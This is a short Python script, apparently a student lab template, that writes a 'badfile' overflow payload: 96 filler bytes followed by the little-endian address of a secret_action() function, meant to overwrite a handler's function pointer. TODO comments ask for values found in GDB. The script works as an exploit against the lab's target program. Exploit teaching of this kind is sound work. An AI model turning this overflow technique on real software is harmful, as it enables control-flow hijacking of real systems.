#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Address of secret_action() — printed by the target program
secret_action_addr = 0x5655629c   # TODO: Replace

# Offset from user->name to handler->action
offset = 96                        # TODO: Replace

# ============================================================
# TODO: Construct the payload
# ============================================================

payload = b"A" * offset + p32(secret_action_addr)

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(payload)

print("badfile generated successfully!")
